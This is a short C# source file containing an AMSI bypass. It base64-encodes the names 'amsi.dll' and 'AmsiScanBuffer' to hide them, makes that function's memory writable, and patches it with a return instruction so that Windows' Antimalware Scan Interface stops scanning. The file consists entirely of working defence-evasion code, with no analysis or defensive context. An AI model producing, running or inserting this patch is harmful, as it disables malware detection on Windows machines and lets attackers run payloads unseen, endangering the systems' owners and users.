using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string encL = "YW1zaS5kbGw=";
            string decL = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encL));

            string encP = "QW1zaVNjYW5CdWZmZXI=";
            string decP = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encP));

            var lib = Win32.LoadLibrary(decL);
            var addr = Win32.GetProcAddress(lib, decP);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}